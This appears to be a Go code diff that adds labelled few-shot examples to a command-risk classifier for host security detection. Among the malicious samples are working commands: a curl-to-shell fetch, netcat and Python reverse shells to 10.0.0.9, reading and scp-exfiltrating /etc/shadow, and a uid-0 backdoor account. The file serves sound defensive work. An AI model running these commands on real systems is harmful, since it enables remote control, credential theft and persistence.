@@ -49,19 +49,50 @@ var fewShot = []struct {
 	Command string
 	JSON    string
 }{
+	// --- benign (keep these so the model doesn't over-flag) ---
 	{
 		Command: "apt-get update",
 		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","risk_indicators":[]}`,
-	},
-	{
-		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
-		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script piped into a shell","risk_indicators":["curl|sh"]}`,
 	},
 	{
 		// Benign twin: a desktop/JS process that superficially looks scriptish
 		// but is a normal GNOME extension — must score LOW (curbs false positives).
 		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
 		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","risk_indicators":[]}`,
+	},
+	// --- malicious / suspicious tradecraft, by their own argv (so DIRECT,
+	//     non-bash commands get flagged — a 1B model leans on these examples) ---
+	{
+		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
+		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script piped into a shell","risk_indicators":["curl|sh"]}`,
+	},
+	{
+		Command: "nc -e /bin/sh 10.0.0.9 4444",
+		JSON:    `{"risk_score":0.96,"verdict":"malicious","reason":"netcat reverse shell to a remote host","risk_indicators":["nc -e","reverse-shell"]}`,
+	},
+	{
+		Command: "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.9',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])",
+		JSON:    `{"risk_score":0.96,"verdict":"malicious","reason":"python reverse shell","risk_indicators":["python","reverse-shell"]}`,
+	},
+	{
+		Command: "cat /etc/shadow",
+		JSON:    `{"risk_score":0.8,"verdict":"malicious","reason":"reading the password hash file","risk_indicators":["/etc/shadow","credential-access"]}`,
+	},
+	{
+		Command: "scp /etc/shadow root@10.0.0.9:/tmp/",
+		JSON:    `{"risk_score":0.9,"verdict":"malicious","reason":"exfiltrating credentials to a remote host","risk_indicators":["scp","exfil"]}`,
+	},
+	{
+		Command: "useradd -o -u 0 -g 0 backdoor",
+		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"creating a hidden uid-0 backdoor account","risk_indicators":["useradd","uid-0"]}`,
+	},
+	{
+		Command: "nmap -sS 192.168.0.0/24",
+		JSON:    `{"risk_score":0.6,"verdict":"suspicious","reason":"network port scan / reconnaissance","risk_indicators":["nmap","recon"]}`,
+	},
+	{
+		Command: "chmod 777 /tmp/payload",
+		JSON:    `{"risk_score":0.55,"verdict":"suspicious","reason":"making a dropped file world-executable","risk_indicators":["chmod","tmp-exec"]}`,
 	},
 }
 
